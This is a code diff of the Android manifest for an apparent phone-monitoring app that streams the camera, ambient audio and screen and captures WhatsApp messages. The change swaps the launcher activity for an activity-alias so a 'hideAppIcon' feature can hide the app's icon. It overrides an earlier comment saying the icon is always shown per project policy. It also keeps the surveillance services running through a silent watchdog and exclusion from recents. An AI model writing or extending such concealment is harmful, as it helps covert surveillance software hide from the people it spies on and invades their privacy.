@@ -77,18 +77,23 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.SpappMonitoring">
 
-        <!-- Visible launcher entry point — app icon is always shown, per project policy -->
+        <!-- Visible launcher entry point via alias so hideAppIcon never disables the core activity -->
         <activity
             android:name=".ui.SplashActivity"
             android:exported="true"
             android:excludeFromRecents="true"
             android:autoRemoveFromRecents="true"
-            android:theme="@style/Theme.SpappMonitoring">
+            android:theme="@style/Theme.SpappMonitoring" />
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".ui.SplashActivity"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Mandatory first-launch consent screen -->
         <activity
@@ -158,7 +163,6 @@
         <!-- FCM push — instant command delivery (Phase 6) -->
         <service
             android:name=".fcm.SpappFirebaseMessagingService"
-            android:process=":service"
             android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
@@ -180,7 +184,6 @@
             android:name=".blocking.BlockAccessibilityService"
             android:exported="true"
             android:stopWithTask="false"
-            android:process=":service"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -195,7 +198,6 @@
             android:name=".camerastream.CameraStreamService"
             android:exported="false"
             android:stopWithTask="false"
-            android:process=":service"
             android:foregroundServiceType="camera" />
 
         <!-- Live surrounding / ambient audio streaming service -->
@@ -203,7 +205,6 @@
             android:name=".audiostream.AudioStreamService"
             android:exported="false"
             android:stopWithTask="false"
-            android:process=":service"
             android:foregroundServiceType="microphone" />
 
         <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
@@ -211,7 +212,6 @@
             android:name=".screenstream.ScreenStreamService"
             android:exported="false"
             android:stopWithTask="false"
-            android:process=":service"
             android:foregroundServiceType="dataSync" />
 
         <!-- Persistent silent background watchdog to keep process alive across recents clear -->
@@ -219,7 +219,6 @@
             android:name=".sync.PersistentWatchdogService"
             android:exported="false"
             android:stopWithTask="false"
-            android:process=":service"
             android:foregroundServiceType="dataSync" />
 
         <!-- Notification listener for WhatsApp chat message capture -->
@@ -227,7 +226,6 @@
             android:name=".collectors.WhatsAppNotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:stopWithTask="false"
-            android:process=":service"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
